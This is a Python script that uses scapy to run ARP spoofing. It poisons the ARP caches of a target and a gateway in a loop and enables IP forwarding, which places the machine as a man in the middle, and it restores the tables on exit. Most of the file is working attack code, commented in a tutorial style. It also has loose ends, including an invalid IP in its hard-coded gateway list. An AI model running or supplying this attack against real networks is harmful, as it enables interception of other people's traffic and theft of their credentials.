#!/usr/bin/env python

import scapy.all as scapy  # handle tasks like scanning and network discovery
import time  # use sleep() for delays
import argparse  # get values as arguments


# function that returns MAC address of selected IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = broadcast / arp_request  # Combine into a single packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # Send packets with custom Ether,
    # send packet and receive response. "timeout": Time to wait for response
    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        print("[!] No response..")


# function that creates a man in the middle
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2: send packet as response, not request
    # pdst: destination target IP address
    # hwdst: destination target MAC address
    # psrc: source IP address, here equal to router
    # hwsrc: source MAC address
    # Target sees attacker's MAC address but thinks it's the router cause of the IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)  # count: number of times to send


# a tuple containing all the default router gateways
router_default = ('10.90.90.90', '192.168.0.50', '10.1.1.1', '192.168.0.3', '192.168.0.1', '192.168.1.99',
                  '192.168.10.50', '192.168.254.254', '192.168.0.10', '192.168.123.254', '10.0.0.138', '10.0.0.2',
                  '192.168.3.1', '192.168.2.1', '192.168.100.100', '192.168.223.100', '192.168.0.227', '192.168.1.254',
                  '192.168.0.254', '192.168.100.1', '192.168.11.1', '192.168.0.101', '10.0.1.1', '192.168.30.1',
                  '192.168.2.254', '192.168.102.1', '192.168.55.1', '10.10.1.1', '192.168.1.200', '192.168.168.168',
                  '192.168.251.1', '192.168.10.100', '192.168.16.1', '192.168.15.1', '192.168.86.1', '192.168.10.10',
                  '192.168.1.10.1', '10.1.10.1', '192.168.20.1', '192.168.1.1', '192.168.50.1', '192.168.0.100',
                  '192.168.1.10', '192.168.1.20', '192.168.1.210', '192.168.10.1', '192.168.62.1', '200.200.200.5',
                  '192.168.4.1', '10.0.0.1', '192.168.1.100', '192.168.8.1', '192.168.0.30')
scan_list = ['10.0.2.8', '10.0.2.1']
sent_packets_count = 0
for ip in scan_list:
    if ip in router_default:
        print('{}'.format(ip))
    else:
        print('not in')
target = input('Your target IP: ')
source = input('Your source IP: ')
try:
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write("1")  # enable ip forwarding to allow flow of packets through machine
    while True:
        spoof(target, source)
        spoof(source, target)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # dynamic print
        time.sleep(2)  # 2 seconds delay
except KeyboardInterrupt:
    print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
    restore(target, source)
    restore(source, target)
    print("[+] Done!")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write("0")  # disable ip forwarding
